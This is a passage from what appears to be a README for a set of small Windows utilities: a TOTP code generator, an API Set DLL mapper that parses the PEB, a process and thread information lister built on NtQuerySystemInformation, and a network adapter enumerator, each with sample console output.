- TOTP's are scoped to a full `UtcNow` minute.
- It is of course possible to adjust the timespan during which a code is valid but generating a new one every minute seems reasonable.
- It would be easy, and recommended, that a forgiveness mechanic is added to `generateTOTP` so it calculates the current and previous TOTP in case an authentication code is generated before the minute rolls over and is received during the next minute.


```
C:\>totp_gen.exe -s HelloWorld
  _       _
 | |_ ___| |_ _ __ ___ __ _ ___ ___
 |  _/ _ \  _| '_ \___/ _` / -_)   \
  \__\___/\__| .__/   \__, \___|_||_|
             |_|      |___/

[+] TOTP valid for 30 seconds
[>] TOTP code --> 1447475300

C:\>totp_gen.exe -s Jumanji
  _       _
 | |_ ___| |_ _ __ ___ __ _ ___ ___
 |  _/ _ \  _| '_ \___/ _` / -_)   \
  \__\___/\__| .__/   \__, \___|_||_|
             |_|      |___/

[+] TOTP valid for 23 seconds
[>] TOTP code --> 587402414

C:\>totp_gen.exe -s Jumanji -c 587402414
  _       _
 | |_ ___| |_ _ __ ___ __ _ ___ ___
 |  _/ _ \  _| '_ \___/ _` / -_)   \
  \__\___/\__| .__/   \__, \___|_||_|
             |_|      |___/

[+] TOTP code is valid

C:\>totp_gen.exe -s Jumanji -c 999902414
  _       _
 | |_ ___| |_ _ __ ___ __ _ ___ ___
 |  _/ _ \  _| '_ \___/ _` / -_)   \
  \__\___/\__| .__/   \__, \___|_||_|
             |_|      |___/

[!] TOTP code is invalid
```

## Windows API

### GetAPISetMapping

This project parses the PEB to match Windows API Set DLL's to their host DLL. This code is adapted from [Lunar](https://github.com/Dewera/Lunar/) by [@fakedewera](https://twitter.com/fakedewera).

```
C:\> GetAPISetMapping.exe
 >--~~--> Args? <--~~--<

-List   (-l)       Boolean: List all know API Set mappings.
-Search (-s)       String: Perform string match based on partial or full API Set name.

 >--~~--> Usage? <--~~--<

GetAPISetMapping.exe -l
GetAPISetMapping.exe -s "api-ms-win-appmodel-state-l1-2-0.dll"

C:\> GetAPISetMapping.exe -s "win-dx-d3dkmt"
API Set: api-ms-win-dx-d3dkmt-l1-1-5.dll  -->  gdi32.dll
API Set: ext-ms-win-dx-d3dkmt-dxcore-l1-1-0.dll  -->  dxcore.dll
API Set: ext-ms-win-dx-d3dkmt-gdi-l1-1-0.dll  -->  gdi32.dll

C:\> GetAPISetMapping.exe -l
API Set: api-ms-onecoreuap-print-render-l1-1-0.dll  -->  printrenderapihost.dll
API Set: api-ms-win-appmodel-identity-l1-2-0.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-runtime-internal-l1-1-6.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-runtime-l1-1-3.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-state-l1-1-2.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-state-l1-2-0.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-unlock-l1-1-0.dll  -->  kernel.appcore.dll
API Set: api-ms-win-base-bootconfig-l1-1-0.dll  -->  advapi32.dll
API Set: api-ms-win-base-util-l1-1-0.dll  -->  advapi32.dll
API Set: api-ms-win-composition-redirection-l1-1-0.dll  -->  dwmredir.dll
API Set: api-ms-win-composition-windowmanager-l1-1-0.dll  -->  udwm.dll
API Set: api-ms-win-containers-cmclient-l1-1-1.dll  -->  cmclient.dll

[...Snipped...]
```

### SystemProcessAndThreadsInformation

While working on a side project I had to access out-of-process thread information, to do this I used NtQuerySystemInformation -> SystemProcessAndThreadInformation. As it may be helpful for reference I wrote a small wrapper round this function to list process and thread information for a specific PID. Note that I am not extracting all available information from SYSTEM_PROCESSES and SYSTEM_THREAD_INFORMATION, feel free to extend the output with a pull request.

```
C:\> SystemProcessAndThreadsInformation.exe -p 4508

[+] Process Details
    ImageName           : powershell.exe
    ProcessId           : 4508
    ParentPid           : 8256
    HandleCount         : 701
    ThreadCount         : 25
    SessionId           : 1
    Priority            : 8
    CreateTime          : 0d:22h:0m:31s:876ms
    UserTime            : 0d:0h:0m:0s:328ms
    KernelTime          : 0d:0h:0m:0s:281ms
    WorkingSetSize      : 73.52734375 MB
    PeakWorkingSetSize  : 73.5859375 MB
    PageFaultCount      : 26896

[+] Thread Details
[>] TID: 9832, Priority: 9
    |-> StartAddress: 0x7FFB84833670
    |-> Created: 0d:22h:0m:31s:876ms, uTime: 0d:0h:0m:0s:46ms, kTime: 0d:0h:0m:0s:93ms
    |-> WaitTime: 5843708, WaitReason: UserRequest
    |-> State: Wait, ContextSwitches: 232

[>] TID: 5552, Priority: 8
    |-> StartAddress: 0x7FFB84833670
    |-> Created: 0d:22h:0m:31s:970ms, uTime: 0d:0h:0m:0s:15ms, kTime: 0d:0h:0m:0s:15ms
    |-> WaitTime: 5843460, WaitReason: WrQueue
    |-> State: Wait, ContextSwitches: 38

[>] TID: 15716, Priority: 8
    |-> StartAddress: 0x7FFB84833670
    |-> Created: 0d:22h:0m:31s:970ms, uTime: 0d:0h:0m:0s:15ms, kTime: 0d:0h:0m:0s:0ms
    |-> WaitTime: 5843460, WaitReason: WrQueue
    |-> State: Wait, ContextSwitches: 30

[...Snipped...]
```

### GetNetworkInterfaces

GetNetworkInterfaces is a small .Net45 utility to pull local network adapter information. It mostly has feature parity with "ipconfig /all" and can be useful for some fast enumeration.

```
C:\> GetNetworkInterfaces.exe

[...Snipped...]

VMware Virtual Ethernet Adapter for VMnet8
  Name .................................... : VMware Network Adapter VMnet8
  Interface type .......................... : Ethernet
  Physical Address ........................ : 005056C00008
  Operational status ...................... : Up
  IP version .............................. : IPv4 IPv6
  IPv6 .................................... : fe80::2101:9102:751a:fdd2%16
  IPv4 .................................... : 192.168.199.1
  Mask .................................... : 255.255.255.0
  DHCP .................................... : True
  DHCP Server ............................. : 192.168.199.254
  DNS Server .............................. : fec0:0:0:ffff::1%1
  DNS Server .............................. : fec0:0:0:ffff::2%1
  DNS Server .............................. : fec0:0:0:ffff::3%1
  Dynamic DNS ............................. : True
  DNS suffix .............................. :
  DNS enabled ............................. : False
  Primary WINS Server ..................... : 192.168.199.2

[...Snipped...]
```